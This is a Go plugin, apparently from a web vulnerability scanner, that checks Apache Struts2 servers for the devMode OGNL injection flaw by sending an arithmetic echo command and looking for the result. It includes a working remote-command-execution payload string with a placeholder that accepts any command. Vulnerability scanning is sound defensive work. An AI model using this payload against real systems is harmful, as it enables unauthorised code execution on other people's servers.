/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package struts

import (
	"context"
	"strconv"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

var (
	WebPathDevMode     = "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest"
	ExecPayloadDevMode = "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command={cmd}"
)

type devmode struct {
}

func (*devmode) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Infof("开始检测S2-devmode, %s", flow.Request.URL())
			r1 := utils.RandInt(1000000, 10000000)
			r2 := utils.RandInt(1000000, 10000000)
			payload := ExecPayloadDevMode
			payload = strings.Replace(payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
			payload = strings.Replace(payload, "{{r1}}", strconv.Itoa(r1), -1)
			payload = strings.Replace(payload, "{{r2}}", strconv.Itoa(r2), -1)
			req, err := http.NewRequest("GET", utils.UrlJoinPath(flow.Request.URL().String(), payload), nil)
			if err != nil {
				logger.Error(err)
				return nil
			}
			res, err := ab.HTTPClient.Respond(context.TODO(), req)
			if err != nil {
				return nil
			}

			if strings.Contains(res.Text, strconv.Itoa(r1+r2)) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
			}
			return nil
		},
		Channel: "web-directory",
		Binding: &model.VulnBinding{ID: "struts/devmode/default", Plugin: "struts/devmode/default", Category: "struts/devmode/default"},
	}
}
